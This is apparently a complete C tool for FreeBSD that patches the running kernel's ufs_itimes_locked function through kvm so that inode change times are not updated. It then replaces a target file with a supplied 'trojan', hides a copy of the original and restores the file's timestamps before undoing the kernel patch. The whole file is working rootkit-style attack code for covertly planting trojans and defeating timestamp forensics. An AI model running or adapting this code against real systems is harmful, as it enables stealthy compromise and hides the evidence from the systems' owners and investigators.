#include <errno.h>
#include <stdlib.h>
#include <fcntl.h>
#include <kvm.h>
#include <limits.h>
#include <nlist.h>
#include <stdio.h>
#include <sys/time.h>
#include <sys/types.h>
#include <sys/stat.h>
#include <string.h>
#include <utime.h>
#include "magick.h"

#define SIZE 450

/* Replacement code. */
unsigned char	nop_code3[] =
"\x90\x90\x90";
unsigned char	nop_code4[] =
"\x90\x90\x90\x90";

/**
 * Output of "llvm-objdump -dr /boot/kernel/kernel | less"
 * then search for "<ufs_itimes_locked>:"

ffffffff80f38260 <ufs_itimes_locked>:
ffffffff80f38260: 55                    pushq   %rbp
ffffffff80f38261: 48 89 e5              movq    %rsp, %rbp
ffffffff80f38264: 41 56                 pushq   %r14
ffffffff80f38266: 53                    pushq   %rbx
ffffffff80f38267: 48 83 ec 10           subq    $16, %rsp
ffffffff80f3826b: 48 89 fb              movq    %rdi, %rbx
ffffffff80f3826e: 4c 8b 77 18           movq    24(%rdi), %r14
ffffffff80f38272: 49 8b 46 18           movq    24(%r14), %rax
ffffffff80f38276: 4c 89 f7              movq    %r14, %rdi
ffffffff80f38279: ff 90 d8 01 00 00     callq   *472(%rax)
ffffffff80f3827f: 85 c0                 testl   %eax, %eax
ffffffff80f38281: 74 0e                 je      0xffffffff80f38291 <ufs_itimes_locked+0x31>
ffffffff80f38283: 41 80 66 48 f8        andb    $-8, 72(%r14)
ffffffff80f38288: 48 83 c4 10           addq    $16, %rsp
ffffffff80f3828c: 5b                    popq    %rbx
ffffffff80f3828d: 41 5e                 popq    %r14
ffffffff80f3828f: 5d                    popq    %rbp
ffffffff80f38290: c3                    retq
ffffffff80f38291: 41 8b 46 48           movl    72(%r14), %eax
ffffffff80f38295: a8 07                 testb   $7, %al
ffffffff80f38297: 74 ef                 je      0xffffffff80f38288 <ufs_itimes_locked+0x28>
ffffffff80f38299: 8a 0b                 movb    (%rbx), %cl
ffffffff80f3829b: 80 c1 fd              addb    $-3, %cl
ffffffff80f3829e: 48 8b 53 20           movq    32(%rbx), %rdx
ffffffff80f382a2: 80 f9 01              cmpb    $1, %cl
ffffffff80f382a5: 77 0b                 ja      0xffffffff80f382b2 <ufs_itimes_locked+0x52>
ffffffff80f382a7: b9 20 00 00 00        movl    $32, %ecx
ffffffff80f382ac: f6 42 0a 20           testb   $32, 10(%rdx)
ffffffff80f382b0: 74 1b                 je      0xffffffff80f382cd <ufs_itimes_locked+0x6d>
ffffffff80f382b2: f6 42 07 18           testb   $24, 7(%rdx)
ffffffff80f382b6: b9 08 00 00 00        movl    $8, %ecx
ffffffff80f382bb: 74 10                 je      0xffffffff80f382cd <ufs_itimes_locked+0x6d>
ffffffff80f382bd: 89 c2                 movl    %eax, %edx
ffffffff80f382bf: 83 e2 06              andl    $6, %edx
ffffffff80f382c2: 75 09                 jne     0xffffffff80f382cd <ufs_itimes_locked+0x6d>
ffffffff80f382c4: b9 40 00 00 00        movl    $64, %ecx
ffffffff80f382c9: a8 01                 testb   $1, %al
ffffffff80f382cb: 74 0f                 je      0xffffffff80f382dc <ufs_itimes_locked+0x7c>
ffffffff80f382cd: 49 8b 7e 10           movq    16(%r14), %rdi
ffffffff80f382d1: 09 c8                 orl     %ecx, %eax
ffffffff80f382d3: 41 89 46 48           movl    %eax, 72(%r14)
ffffffff80f382d7: e8 c4 f1 db ff        callq   0xffffffff80cf74a0 <vlazy>
ffffffff80f382dc: 48 8d 7d e0           leaq    -32(%rbp), %rdi
ffffffff80f382e0: e8 9b c5 db ff        callq   0xffffffff80cf4880 <vfs_timestamp>
ffffffff80f382e5: 41 8b 4e 48           movl    72(%r14), %ecx
ffffffff80f382e9: f6 c1 01              testb   $1, %cl
ffffffff80f382ec: 74 3b                 je      0xffffffff80f38329 <ufs_itimes_locked+0xc9>
ffffffff80f382ee: 48 8b 45 e0           movq    -32(%rbp), %rax
ffffffff80f382f2: f7 c1 00 04 00 00     testl   $1024, %ecx             # imm = 0x400
ffffffff80f382f8: 75 09                 jne     0xffffffff80f38303 <ufs_itimes_locked+0xa3>
ffffffff80f382fa: 49 8b 4e 38           movq    56(%r14), %rcx
ffffffff80f382fe: 89 41 10              movl    %eax, 16(%rcx)
ffffffff80f38301: eb 08                 jmp     0xffffffff80f3830b <ufs_itimes_locked+0xab>
ffffffff80f38303: 49 8b 4e 38           movq    56(%r14), %rcx
ffffffff80f38307: 48 89 41 20           movq    %rax, 32(%rcx)
ffffffff80f3830b: 41 f6 46 49 04        testb   $4, 73(%r14)
ffffffff80f38310: 8b 45 e8              movl    -24(%rbp), %eax
ffffffff80f38313: 75 0a                 jne     0xffffffff80f3831f <ufs_itimes_locked+0xbf>
ffffffff80f38315: 49 8b 4e 38           movq    56(%r14), %rcx
ffffffff80f38319: 48 83 c1 14           addq    $20, %rcx
ffffffff80f3831d: eb 08                 jmp     0xffffffff80f38327 <ufs_itimes_locked+0xc7>
ffffffff80f3831f: 49 8b 4e 38           movq    56(%r14), %rcx
ffffffff80f38323: 48 83 c1 44           addq    $68, %rcx
ffffffff80f38327: 89 01                 movl    %eax, (%rcx)
ffffffff80f38329: 41 8b 4e 48           movl    72(%r14), %ecx
ffffffff80f3832d: f6 c1 04              testb   $4, %cl
ffffffff80f38330: 74 37                 je      0xffffffff80f38369 <ufs_itimes_locked+0x109>
ffffffff80f38332: 48 8b 45 e0           movq    -32(%rbp), %rax
ffffffff80f38336: f7 c1 00 04 00 00     testl   $1024, %ecx             # imm = 0x400
ffffffff80f3833c: 75 09                 jne     0xffffffff80f38347 <ufs_itimes_locked+0xe7>
ffffffff80f3833e: 49 8b 4e 38           movq    56(%r14), %rcx
ffffffff80f38342: 89 41 18              movl    %eax, 24(%rcx)
ffffffff80f38345: eb 08                 jmp     0xffffffff80f3834f <ufs_itimes_locked+0xef>
ffffffff80f38347: 49 8b 4e 38           movq    56(%r14), %rcx
ffffffff80f3834b: 48 89 41 28           movq    %rax, 40(%rcx)
ffffffff80f3834f: 41 f6 46 49 04        testb   $4, 73(%r14)
ffffffff80f38354: 8b 45 e8              movl    -24(%rbp), %eax
ffffffff80f38357: 75 09                 jne     0xffffffff80f38362 <ufs_itimes_locked+0x102>
ffffffff80f38359: 49 8b 4e 38           movq    56(%r14), %rcx
ffffffff80f3835d: 89 41 1c              movl    %eax, 28(%rcx)
ffffffff80f38360: eb 07                 jmp     0xffffffff80f38369 <ufs_itimes_locked+0x109>
ffffffff80f38362: 49 8b 4e 38           movq    56(%r14), %rcx
ffffffff80f38366: 89 41 40              movl    %eax, 64(%rcx)
ffffffff80f38369: 41 8b 4e 48           movl    72(%r14), %ecx
ffffffff80f3836d: f6 c1 02              testb   $2, %cl
ffffffff80f38370: 0f 84 0d ff ff ff     je      0xffffffff80f38283 <ufs_itimes_locked+0x23>
ffffffff80f38376: 48 8b 45 e0           movq    -32(%rbp), %rax
ffffffff80f3837a: f7 c1 00 04 00 00     testl   $1024, %ecx             # imm = 0x400
ffffffff80f38380: 75 09                 jne     0xffffffff80f3838b <ufs_itimes_locked+0x12b>
ffffffff80f38382: 49 8b 4e 38           movq    56(%r14), %rcx
ffffffff80f38386: 89 41 20              movl    %eax, 32(%rcx)
ffffffff80f38389: eb 08                 jmp     0xffffffff80f38393 <ufs_itimes_locked+0x133>
ffffffff80f3838b: 49 8b 4e 38           movq    56(%r14), %rcx
ffffffff80f3838f: 48 89 41 30           movq    %rax, 48(%rcx)
ffffffff80f38393: 41 f6 46 49 04        testb   $4, 73(%r14)
ffffffff80f38398: 8b 45 e8              movl    -24(%rbp), %eax
ffffffff80f3839b: 75 19                 jne     0xffffffff80f383b6 <ufs_itimes_locked+0x156>
ffffffff80f3839d: 49 8b 4e 38           movq    56(%r14), %rcx
ffffffff80f383a1: 89 41 24              movl    %eax, 36(%rcx)
ffffffff80f383a4: 41 f6 46 49 04        testb   $4, 73(%r14)
ffffffff80f383a9: 74 19                 je      0xffffffff80f383c4 <ufs_itimes_locked+0x164>
ffffffff80f383ab: b8 e8 00 00 00        movl    $232, %eax
ffffffff80f383b0: 49 03 46 38           addq    56(%r14), %rax
ffffffff80f383b4: eb 16                 jmp     0xffffffff80f383cc <ufs_itimes_locked+0x16c>
ffffffff80f383b6: 49 8b 4e 38           movq    56(%r14), %rcx
ffffffff80f383ba: 89 41 48              movl    %eax, 72(%rcx)
ffffffff80f383bd: 41 f6 46 49 04        testb   $4, 73(%r14)
ffffffff80f383c2: 75 e7                 jne     0xffffffff80f383ab <ufs_itimes_locked+0x14b>
ffffffff80f383c4: 49 8b 46 38           movq    56(%r14), %rax
ffffffff80f383c8: 48 83 c0 78           addq    $120, %rax
ffffffff80f383cc: 48 83 00 01           addq    $1, (%rax)
ffffffff80f383d0: e9 ae fe ff ff        jmp     0xffffffff80f38283 <ufs_itimes_locked+0x23>
ffffffff80f383d5: 66 2e 0f 1f 84 00 00 00 00 00 nopw    %cs:(%rax,%rax)
ffffffff80f383df: 90                    nop
*/
// Disable ufs_itimes change time code
// Record existing file's access, modification times
// Copy existing file to hidden file location
// Copy trojan file over existing file
// Set trojan file's access and modification times
// Restore ufs_itimes change time code
int main(int argc, char *argv[])
{
   int		   i, offset1, offset2, offset3, offset4, offset5, fd = -1;
   char		   errbuf[_POSIX2_LINE_MAX];
   kvm_t	  *kd;
   struct nlist	   nl[] = {{NULL}, {NULL},};
   unsigned char   ufs_itimes_code[SIZE];
   struct stat	   sb;
   struct utimbuf  time, file_time;
   char * trojan = NULL;
   char * destination = NULL;
   char * destination_dir = NULL;
   char * pos = NULL;
   size_t dest_dir_str_len = 0;
   int dest_is_file = 0;

   if (argc < 3) {
      printf("[-] Usage: %s [TROJAN FILE] [DESTINATION]\n", argv[0]);
      exit(0);
   }

   trojan = argv[1];
   destination = argv[2];

   if (stat(trojan, &sb) < 0) {
      fprintf(stderr, "[x] %s: STAT ERROR: %d\n", trojan, errno);
      exit(-1);
   } else if (!S_ISREG(sb.st_mode)) {
      printf("[x] %s is not a file\n", trojan);
      exit(-1);
   }

   if (stat(destination, &sb) < 0) {
      fprintf(stderr, "[x] %s: STAT ERROR: %d\n", destination, errno);
      exit(-1);
   }

   // Determine if destination a file or directory
   if (S_ISDIR(sb.st_mode)) {
      destination_dir = destination;
   } else if (S_ISREG(sb.st_mode)) {
      dest_is_file = 1;
      file_time.actime = sb.st_atime;
      file_time.modtime = sb.st_mtime;
      // Find last '/' character in destination path
      if ((pos=strrchr(destination, '/')) == NULL) {
         printf("[x] No '/' character found in destination path: %s\n", destination);
         exit(-1);
      }

      dest_dir_str_len = pos - destination;
      printf("[-] Allocating %lu bytes for destination directory\n", dest_dir_str_len);
      destination_dir = malloc(dest_dir_str_len+1);
      bzero(destination_dir, dest_dir_str_len+1);
      strncpy(destination_dir, destination, dest_dir_str_len);
   } else {
      printf("[x] Destination %s is not a directory or file\n", destination);
      exit(-1);
   }

   if (dest_is_file) {
      printf("[-] Destination file is %s\n", destination);
   }

   printf("[-] Destination directory is %s\n", destination_dir);

   /* Initialize kernel virtual memory access. */
   kd = kvm_openfiles(NULL, NULL, NULL, O_RDWR, errbuf);
   if (kd == NULL) {
      fprintf(stderr, "[x] ERROR: %s\n", errbuf);
      exit(-1);
   }
   nl[0].n_name = "ufs_itimes_locked";
   if (kvm_nlist(kd, nl) < 0) {
      fprintf(stderr, "[x] ERROR: %s\n", kvm_geterr(kd));
      exit(-1);
   }
   if (!nl[0].n_value) {
      fprintf(stderr, "[x] ERROR: Symbol %s not found\n",
	      nl[0].n_name);
      exit(-1);
   }
   /* Save a copy of ufs_itimes. */
   if (kvm_read(kd, nl[0].n_value, ufs_itimes_code, SIZE) < 0) {
      fprintf(stderr, "[x] ERROR: %s\n", kvm_geterr(kd));
      exit(-1);
   }
   /*
    * Search through ufs_itimes_locked for the following three lines:
    *
    * DIP_SET(ip, i_ctime, ts.tv_sec);
    *
    * DIP_SET(ip, i_ctimensec, ts.tv_nsec);
    *
    * DIP_SET(ip, i_modrev, DIP(ip, i_modrev) + 1);
    *
    * We will NOP out the lines that write to memory.

ffffffff80f38386: 89 41 20              movl    %eax, 32(%rcx)
ffffffff80f3838f: 48 89 41 30           movq    %rax, 48(%rcx)
ffffffff80f383a1: 89 41 24              movl    %eax, 36(%rcx)
ffffffff80f383ba: 89 41 48              movl    %eax, 72(%rcx)
ffffffff80f383cc: 48 83 00 01           addq    $1, (%rax)
*/

   for (i = 0; i < SIZE - 3; i++) {
      if (ufs_itimes_code[i] == 0x89 &&
	  ufs_itimes_code[i + 1] == 0x41 &&
	  ufs_itimes_code[i + 2] == 0x20)
	 offset1 = i;
      if (ufs_itimes_code[i] == 0x48 &&
	  ufs_itimes_code[i + 1] == 0x89 &&
	  ufs_itimes_code[i + 2] == 0x41 &&
	  ufs_itimes_code[i + 3] == 0x30)
	 offset2 = i;
      if (ufs_itimes_code[i] == 0x89 &&
	  ufs_itimes_code[i + 1] == 0x41 &&
	  ufs_itimes_code[i + 2] == 0x24)
	 offset3 = i;
      if (ufs_itimes_code[i] == 0x89 &&
	  ufs_itimes_code[i + 1] == 0x41 &&
	  ufs_itimes_code[i + 2] == 0x48)
	 offset4 = i;
      if (ufs_itimes_code[i] == 0x48 &&
	  ufs_itimes_code[i + 1] == 0x83 &&
	  ufs_itimes_code[i + 2] == 0x00 &&
	  ufs_itimes_code[i + 3] == 0x01)
	 offset5 = i;
   }

   /* Save destination directory access and modification times. */
   if (stat(destination_dir, &sb) < 0) {
      fprintf(stderr, "[x] %s: STAT ERROR: %d\n", destination_dir, errno);
      exit(-1);
   }
   time.actime = sb.st_atime;
   time.modtime = sb.st_mtime;

   if (!dest_is_file) {
      file_time = time;
   }

   /* Patch ufs_itimes. */
   if (kvm_write(kd, nl[0].n_value + offset1, nop_code3,
		 sizeof(nop_code3) - 1) < 0) {
      fprintf(stderr, "[x] NOP offset1 at %d, ERROR: %s\n",
         offset1, kvm_geterr(kd));
      exit(-1);
   }
   if (kvm_write(kd, nl[0].n_value + offset2, nop_code4,
		 sizeof(nop_code4) - 1) < 0) {
      fprintf(stderr, "[x] NOP offset2 at %d, ERROR: %s\n",
         offset2, kvm_geterr(kd));
      exit(-1);
   }
   if (kvm_write(kd, nl[0].n_value + offset3, nop_code3,
		 sizeof(nop_code3) - 1) < 0) {
      fprintf(stderr, "[x] NOP offset3 at %d, ERROR: %s\n",
         offset3, kvm_geterr(kd));
      exit(-1);
   }
   if (kvm_write(kd, nl[0].n_value + offset4, nop_code3,
		 sizeof(nop_code3) - 1) < 0) {
      fprintf(stderr, "[x] NOP offset4 at %d, ERROR: %s\n",
         offset4, kvm_geterr(kd));
      exit(-1);
   }
   if (kvm_write(kd, nl[0].n_value + offset5, nop_code4,
		 sizeof(nop_code4) - 1) < 0) {
      fprintf(stderr, "[x] NOP offset5 at %d, ERROR: %s\n",
         offset5, kvm_geterr(kd));
      exit(-1);
   }

   // Copy existing file to hidden file location
   if (dest_is_file) {
      printf("[-] Copying existing file %s to %s.%s\n", destination,
         destination, T_NAME);
      char * copy_existing = malloc(3 + strlen(destination) + 1 +
         strlen(destination) + 1 + strlen(T_NAME));
      pos = copy_existing;
      strcpy(pos, "cp ");
      pos+=3;
      strcpy(pos, destination);
      pos+=strlen(destination);
      strcpy(pos, " ");
      pos++;
      strcpy(pos, destination);
      pos+=strlen(destination);
      strcpy(pos, ".");
      pos++;
      strcpy(pos, T_NAME);

      printf("[-] command = %s\n", copy_existing);
      if (system(copy_existing) < 0) {
         printf("[x] Failed to copy existing file %s to %s.%s\n", destination,
            destination, T_NAME);
      }

      free(copy_existing);
   }

   /* Copy trojan into DESTINATION. */
   char *string = malloc(3 + strlen(trojan) + 1 + strlen(destination));
   pos = string;
   strcpy(pos, "cp ");
   pos+=3;
   strcpy(pos, trojan);
   pos+=strlen(trojan);
   strcpy(pos, " ");
   pos++;
   strcpy(pos, destination);

   printf("[-] command = %s\n", string);
   if (system(string) < 0) {
      printf("[x] Failed to copy trojan file %s to %s\n", trojan, destination);
   }

   free(string);

   /* Roll back destination directory access and modification times. */
   if (utime(destination, &file_time) < 0) {
      fprintf(stderr, "[x] UTIME ERROR: %d\n", errno);
   }
   /* Restore ufs_itimes_locked. */
   if (utime(destination_dir, &time) < 0) {
      fprintf(stderr, "[x] UTIME ERROR: %d\n", errno);
   }
   /* Restore ufs_itimes_locked. */
   if (kvm_write(kd, nl[0].n_value + offset1, &ufs_itimes_code[offset1],
		 sizeof(nop_code3) - 1) < 0) {
      fprintf(stderr, "[x] Restore offset1 at %d, ERROR: %s\n",
         offset1, kvm_geterr(kd));
      exit(-1);
   }
   if (kvm_write(kd, nl[0].n_value + offset2, &ufs_itimes_code[offset2],
		 sizeof(nop_code4) - 1) < 0) {
      fprintf(stderr, "[x] Restore offset2 at %d, ERROR: %s\n",
         offset2, kvm_geterr(kd));
      exit(-1);
   }
   if (kvm_write(kd, nl[0].n_value + offset3, &ufs_itimes_code[offset3],
		 sizeof(nop_code3) - 1) < 0) {
      fprintf(stderr, "[x] Restore offset3 at %d, ERROR: %s\n",
         offset3, kvm_geterr(kd));
      exit(-1);
   }
   if (kvm_write(kd, nl[0].n_value + offset4, &ufs_itimes_code[offset4],
		 sizeof(nop_code3) - 1) < 0) {
      fprintf(stderr, "[x] Restore offset4 at %d, ERROR: %s\n",
         offset4, kvm_geterr(kd));
      exit(-1);
   }
   if (kvm_write(kd, nl[0].n_value + offset5, &ufs_itimes_code[offset5],
		 sizeof(nop_code4) - 1) < 0) {
      fprintf(stderr, "[x] Restore offset5 at %d, ERROR: %s\n",
         offset5, kvm_geterr(kd));
      exit(-1);
   }
   /* Close kd. */
   if (kvm_close(kd) < 0) {
      fprintf(stderr, "[x] ERROR: %s\n", kvm_geterr(kd));
      exit(-1);
   }

   printf("[-] Trojan successfully planted\n");
   exit(0);
}
